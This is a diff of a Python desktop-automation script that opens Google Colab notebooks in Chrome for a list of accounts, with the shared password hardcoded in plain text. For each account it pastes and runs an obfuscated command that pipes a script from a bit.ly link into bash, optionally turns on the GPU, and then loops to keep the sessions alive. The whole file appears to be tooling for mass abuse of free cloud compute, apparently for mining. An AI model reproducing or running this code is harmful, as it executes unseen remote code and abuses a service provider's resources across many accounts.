@@ -3,12 +3,12 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "!i=003;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash 1> /tmp/1.log  2> /tmp/1err.log"
-listfile = '/home/one/g80p5'
+col_cmd = "! i=003;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash 1> /tmp/1.log  2> /tmp/1err.log"
+listfile = '/home/one/g80p1'
 gpass = "Ms123456789"
 new = True
 global_slow_motion = 1
-
+enable_gpu = False
 speed = 200
 
 
@@ -43,7 +43,7 @@ def save_key():
     pyautogui.press('a')
     pyautogui.keyUp('ctrlright')
 
-def human_click(x_pos=1200, y_pos=400, slow_motion=1):
+def human_click(x_pos=600, y_pos=400, slow_motion=1):
     time.sleep(0.1*slow_motion)
     pyautogui.moveTo(x_pos+4, y_pos+4)
     time.sleep(0.1*slow_motion)
@@ -75,7 +75,7 @@ def human_clear_all():
     pyautogui.keyUp('backspace')
 
 
-def colab_top(x_top=1594, y_top=250, slow_motion=1):
+def colab_top(x_top=1360, y_top=210, slow_motion=1):
     time.sleep(0.1*slow_motion)
     pyautogui.mouseDown(x_top, y_top, 'left')
     pyautogui.mouseUp(x_top, y_top, 'left')
@@ -144,7 +144,7 @@ def colab_clear_logs(x=80, y=280, slow_motion=1):
     time.sleep(1*slow_motion)
 
 
-def colab_clear_cmd2(x_clear_cmd=300, y_clear_cmd=240, new_cmd='!wget -q -O - bit.ly/CPU01 | bash', slow_motion=1):
+def colab_clear_cmd2(x_clear_cmd=300, y_clear_cmd=245, new_cmd='!wget -q -O - bit.ly/CPU01 | bash', slow_motion=1):
     time.sleep(1*slow_motion)
     colab_top()
     time.sleep(1*slow_motion)
@@ -202,7 +202,7 @@ def old_chrome_enable_gpu(x_edit=128, y_edit=148, x_parm=156, y_param=484, slow_
     time.sleep(0.1*slow_motion)
 
 
-def chrome_new_colab(g_id="testcolab10001", g_pass="********", slow_motion=1):
+def chrome_new_colab(g_id="testcolab10001", g_pass="********", slow_motion=1,enable_gpu=True):
     time.sleep(1*slow_motion)
     chrome_new_container2()
     chrome_new_url(
@@ -211,7 +211,8 @@ def chrome_new_colab(g_id="testcolab10001", g_pass="********", slow_motion=1):
     chrome_new_url(c_url='https://colab.research.google.com/#create=true')
     colab_clear_cmd2(new_cmd=col_cmd)
     time.sleep(3*slow_motion)
-    chrome_enable_gpu()
+    if enable_gpu:
+        chrome_enable_gpu()
     colab_doexec2()
 
 
@@ -303,50 +304,55 @@ debug = 0
 
 # openfiles
 # Using readlines()
-file1 = open(listfile, 'r')
-Lines = file1.readlines()
+def gids_file_lanch(listfile,gpass,enable_gpu=True):
+    file1 = open(listfile, 'r')
+    Lines = file1.readlines()
 
-count = 0
-if new == True:
-    # Strips the newline character
-    for line in Lines:
-        count += 1
-        #print("Line{}: {}".format(count, line.strip()))
-        gid = line.strip('\n')
-        gid = gid.strip('\r')
-        chrome_new_colab(gid, gpass)
+    count = 0
+    if new == True:
+        # Strips the newline character
+        for line in Lines:
+            count += 1
+            #print("Line{}: {}".format(count, line.strip()))
+            gid = line.strip('\n')
+            gid = gid.strip('\r')
+            chrome_new_colab(gid, gpass,enable_gpu=enable_gpu)
 
 # refresh
-while (debug == 0):
-    debug = 0
-    speed = get_speed()
-    time.sleep(2*global_slow_motion)
-    winTitle = window.get_active_title()
-    winClass = window.get_active_class()
-    if (winClass == "google-chrome.Google-chrome" or
-    winClass == "microsoft-edge-beta.Microsoft-edge-beta"):
-        if winTitle.find("ipynb") != -1:
-            if speed < 25 :
-                chrome_colab_refresh()
+def keep_allive(debug=0,slow_motion=1):
+    while (debug == 0):
+        debug = 0
+        speed = get_speed()
+        time.sleep(2*slow_motion)
+        winTitle = window.get_active_title()
+        winClass = window.get_active_class()
+        if (winClass == "google-chrome.Google-chrome" or
+        winClass == "microsoft-edge-beta.Microsoft-edge-beta"):
+            if winTitle.find("ipynb") != -1:
+                if speed < 25 :
+                    chrome_colab_refresh()
+                else:
+                    chrome_colab_refresh_fast()
+                if debug != 0:
+                    # dialog.info_dialog("winTitle",winTitle)
+                    chrome_new_colab("soudi10001", "*******")
+                chrome_next()
+            elif winTitle.find("Cloud Shell") != -1:
+                #gshell_reconnect()
+                exit_key()
+                ### next page ###
+                if debug != 0:
+                    dialog.info_dialog("winTitle", winTitle)
+                chrome_next()
             else:
-                chrome_colab_refresh_fast()
-            if debug != 0:
-                # dialog.info_dialog("winTitle",winTitle)
-                chrome_new_colab("soudi10001", "*******")
-            chrome_next()
-        elif winTitle.find("Cloud Shell") != -1:
-            #gshell_reconnect()
-            exit_key()
-            ### next page ###
-            if debug != 0:
-                dialog.info_dialog("winTitle", winTitle)
-            chrome_next()
+                time.sleep(5)
+                if debug != 0:
+                    dialog.info_dialog("winTitle", winTitle)
+                # colab_full_refresh()
+                exit_key()
+                #chrome_next()
         else:
             time.sleep(5)
-            if debug != 0:
-                dialog.info_dialog("winTitle", winTitle)
-            # colab_full_refresh()
-            exit_key()
-            #chrome_next()
-    else:
-        time.sleep(5)
+
+gids_file_lanch(listfile,gpass,enable_gpu=enable_gpu)
+keep_allive(debug=0,slow_motion=global_slow_motion)
